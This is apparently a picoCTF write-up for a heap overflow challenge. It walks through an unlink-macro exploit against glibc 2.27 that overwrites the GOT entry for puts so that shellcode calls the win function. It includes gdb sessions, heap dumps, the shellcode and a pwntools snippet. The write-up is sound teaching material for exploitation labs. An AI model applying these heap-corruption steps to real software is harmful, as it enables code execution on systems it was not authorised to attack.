# Heap Overflow (pwn, pico, heap-exploitation, heap-overflow, unlink macro, free, GOT)

### Notes:
- source code given
- binary given
- glibc 2.27

### Enumeration
Again, the code is very simple and we can immediately spot the code vulnerable use of `gets` calls. This allows the attacker to overflow the heap in 3 places.

### Exploit
Althought the code allows the attacker to overflow the heap in 2 places we will take advantage of just first one.

The flow will be as follows:
```c
[...]
gets(fullname); // send exploit
[...]
free(fullname); // the exploit will get invoked and will overwrite the got.puts entry with the shellcode addres
puts("That is all...\n"); // GOT is overwriten and so the shellcode will be executed. Shellcode will call win function
[...]
```

Before we dive in to writing an exploit, it is important to understand how free will call the `unlink macro`.
When small or large chunk is being freed the program checks if the previous (in memory) or next (in memory) chunk was already freed. If yes it will unlink them from the bins they are in and append them to the chunk which is being freed. Then this big chunk is placed in unsorted bin. This prevents memory fragmentation.

Let's look at the memory layout on heap, so it is easier to follow. Open a program under gdb and set breakpoint on the `free(fullname)` instruction. Then run the program providing AAAA..A as fullname, BBB..B as lastname.

```gdb
$ gdb -q vuln
Reading symbols from vuln...(no debugging symbols found)...done.
gdb-peda$ start
gdb-peda$ pd
   [...]
=> 0x080489ee <+15>:	sub    esp,0x10
   [...]
   0x08048a8b <+172>:	push   DWORD PTR [ebp-0xc]
   0x08048a8e <+175>:	call   0x8048710 <gets@plt>
   0x08048a93 <+180>:	add    esp,0x10
   0x08048a96 <+183>:	sub    esp,0xc
   0x08048a99 <+186>:	push   DWORD PTR [ebp-0x14]
   0x08048a9c <+189>:	call   0x8049aa4 <free>
   0x08048aa1 <+194>:	add    esp,0x10
   [...]
gdb-peda$ b *0x08048a9c
gdb-peda$ r < <(python -c "print 'A'*666 + '\x0a' + 'B' * 66 + '\x0a'")
Oops! a new developer copy pasted and printed an address as a decimal...
134537224
Input fullname
Input lastname
``` 

Ok, now when we hit a breakpoint let's check out a heap.

```gdb
gdb-peda$ vmmap
Start      End        Perm	Name
[...]
0x0804e000 0x08050000 rwxp	[heap]
[...]
0xfffdd000 0xffffe000 rwxp	[stack]
gdb-peda$ x/512wx 
gdb-peda$ x/512wx 0x0804e000
0x804e000:	0x00000000	0x000002a1	0x41414141	0x41414141
0x804e010:	0x41414141	0x41414141	0x41414141	0x41414141
[...]
0x804e210:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e220:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e230:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e240:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e250:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e260:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e270:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e280:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e290:	0x41414141	0x41414141	0x41414141	0x41414141
0x804e2a0:	0x00004141	0x00000049	0x00000000	0x00000000
0x804e2b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2e0:	0x00000000	0x00000000	0x00000000	0x00000049
0x804e2f0:	0x42424242	0x42424242	0x42424242	0x42424242
0x804e300:	0x42424242	0x42424242	0x42424242	0x42424242
0x804e310:	0x42424242	0x42424242	0x42424242	0x42424242
0x804e320:	0x42424242	0x42424242	0x42424242	0x42424242
0x804e330:	0x00004242	0x00000409	0x75706e49	0x616c2074
```

We can easly find fullname (0x804e00c) and lastname (0x804e2f0). Remember, we want the `free fullname` to invoke `unlink macro`. So we need a chunk before fullname or after fullname to be marked as freed. The fullname is the first block so we are left with a chunk after fullname.

We will abuse this glibc part of code:
```c
if (nextchunk != av->top) {
    /* get and clear inuse bit */
    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

    /* consolidate forward */
    if (!nextinuse) {
        unlink(av, nextchunk, bck, fwd);
        size += nextsize;
    }
    [...]
}
```

Our nextchunk is the `name` chunk. To mark this chunk as free we have to make sure the inuse bit is reset and the prev size is set.
```gdb
0x804e2a0:	..........  0x00000049	0x00000000	0x00000000
0x804e2b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2e0:	0x00000000	0x00000000	0x00000048	.........0 <- in use bit, this 4 bytes belong to lastname chunk
```

Ok, this should be enought to pass the conditional checks before `unlink`. 

Let's add a shellcode:

```assembly
shellcode:
    mov eax, 0x08048936; address of win function
    call eax
```

into our malicious chunk

```gdb
0x804e2a0:	..........  0x00000049	0x00000000	0x00000000
0x804e2b0:	0x048936b8	0x00d0ff08	0x00000000	0x00000000
0x804e2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2e0:	0x00000000	0x00000000	0x00000048	.........0 <- prev inuse bit, this 4 bytes belong to lastname chunk
```

Ok, so we just have to provide a `fd` and `bk`. As `fd` we will pass an address of `got.puts` - 12 and as `fd` an address of `win` function. The `unlink macro` will then overwrite `got.puts` with shellcode address. The address of heap is dynamic as the `ASLR` is enabled but we have a `firstname` address so we can calculate it.
The `got.puts` we get from objdump or by using pwntools:

```python
from pwn import *
e = ELF('vuln')
print(hex(e.symbols['got.puts'])) # 0x804d028
```


```gdb
0x804e2a0:	..........  0x00000049	0x0804d01c	0x0804e2b0
0x804e2b0:	0x048936b8	0x00d0ff08	0x00000000	0x00000000
0x804e2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804e2e0:	0x00000000	0x00000000	0x00000048	.........0 <- prev inuse bit, this 4 bytes belong to lastname chunk
```

And this should be enought! [Let's try this out](exp.py).
